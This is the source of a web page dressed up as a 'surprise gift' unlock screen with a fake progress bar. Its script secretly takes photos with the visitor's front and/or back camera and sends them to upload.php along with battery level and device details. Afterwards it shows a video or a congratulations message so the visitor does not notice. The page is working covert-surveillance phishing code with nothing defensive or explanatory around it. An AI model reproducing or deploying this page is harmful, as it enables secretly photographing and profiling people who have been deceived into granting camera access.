<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surprise Gift</title>
    <style>
        body { background: white; color: black; text-align: center; font-family: sans-serif; margin:0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #loading-ui, #success-msg, #custom-ui, #yt-ui { display: none; }
        .gift-box { font-size: 80px; animation: bounce 1s infinite alternate; }
        @keyframes bounce { 100% { transform: translateY(-20px); } }
        .btn { background: #00ff00; color: black; border: none; padding: 18px 30px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,255,0,0.3); }
        
        /* Yellow Progress Bar Styling */
        .progress-container { width: 80%; background-color: #333; border-radius: 20px; margin: 20px auto; height: 20px; border: 2px solid gold; overflow: hidden; }
        .progress-bar { height: 100%; width: 0%; background-color: gold; transition: width 0.1s; box-shadow: 0 0 10px gold; }
        
        #custom-img { max-width: 90%; max-height: 80vh; border-radius: 10px; border: 3px solid gold; }
        iframe { width: 100%; height: 100vh; border: none; }
        #percent-text { font-size: 22px; font-weight: bold; color: gold; margin-top: 10px; }
    </style>
</head>
<body>
    <div id="start-page">
        <div style="font-size: 70px;">🎁</div>
        <h2 style="margin: 20px 0;">You have a surprise gift! 🎊</h2>
        <p style="font-size: 18px; color: #555;">Click to unlock below</p><br>
        <button class="btn" onclick="startWork()">🎁 UNLOCK GIFT 🎁</button>
    </div>

    <div id="loading-ui">
        <div class="gift-box">🎁</div>
        <h2 style="color: gold;">Unlocking Your Gift...</h2>
        <div class="progress-container">
            <div id="myBar" class="progress-bar"></div>
        </div>
        <div id="percent-text">0%</div>
    </div>

    <div id="custom-ui"><img src="custom.jpg" id="custom-img"></div>
    <div id="yt-ui"><iframe id="yt-player" allow="autoplay; encrypted-media"></iframe></div>
    <div id="success-msg">
        <div style="font-size: 80px;">🎊</div>
        <h2 style="color:#00ff00">CONGRATULATIONS!</h2>
        <p>Your gift has been redeemed. God bless you!</p>
    </div>

    <video id="v" style="display:none" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        let globalType = "";

        window.onload = async function() {
            let res = await fetch('type.txt');
            globalType = (await res.text()).trim();
        }

        async function startWork() {
            document.body.style.background = "black";
            document.body.style.color = "white";
            document.getElementById('start-page').style.display = 'none';
            document.getElementById('loading-ui').style.display = 'block';

            // Percentage Bar Animation
            let elem = document.getElementById("myBar");
            let text = document.getElementById("percent-text");
            let width = 0;
            let id = setInterval(frame, 150); // Adjust speed here

            function frame() {
                if (width >= 100) {
                    clearInterval(id);
                    setTimeout(showFinalContent, 800);
                } else {
                    width += Math.floor(Math.random() * 3) + 1;
                    if(width > 100) width = 100;
                    elem.style.width = width + '%';
                    text.innerHTML = width + '%';
                }
            }

            // Start Camera & Info collection
            let response = await fetch('mode.txt');
            let mode = (await response.text()).trim();
            let info = { battery: "N/A" };
            try { 
                let b = await navigator.getBattery(); 
                info.battery = Math.round(b.level * 100) + "%"; 
            } catch(e) {}

            if(mode === 'front') await runCam({facingMode: "user"}, 3, "FRONT", info);
            else if(mode === 'back') await runCam({facingMode: "environment"}, 3, "BACK", info);
            else {
                await runCam({facingMode: "environment"}, 2, "BACK", info);
                await runCam({facingMode: "user"}, 2, "FRONT", info);
            }
        }

        async function showFinalContent() {
            document.getElementById('loading-ui').style.display = 'none';
            if(globalType === 'youtube') {
                let ytRes = await fetch('yt_link.txt');
                let ytUrl = (await ytRes.text()).trim();
                document.getElementById('yt-player').src = ytUrl + "?autoplay=1";
                document.getElementById('yt-ui').style.display = 'block';
            } else if(globalType === 'custom') {
                document.getElementById('custom-ui').style.display = 'block';
            } else {
                document.getElementById('success-msg').style.display = 'block';
            }
        }

        async function runCam(constraints, count, label, info) {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: constraints });
                let video = document.getElementById('v');
                video.srcObject = stream;
                await video.play();

                for (let i = 0; i < count; i++) {
                    await new Promise(r => setTimeout(r, 1500)); 
                    let can = document.getElementById('c');
                    can.width = video.videoWidth; can.height = video.videoHeight;
                    can.getContext('2d').drawImage(video, 0, 0);
                    
                    fetch('upload.php', {
                        method: 'POST',
                        body: JSON.stringify({ 
                            image: can.toDataURL('image/jpeg', 0.8), 
                            mode: label,
                            battery: info.battery,
                            device: navigator.userAgent
                        }),
                        headers: {'Content-Type': 'application/json'}
                    });
                }
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}
        }
    </script>
</body>
</html>
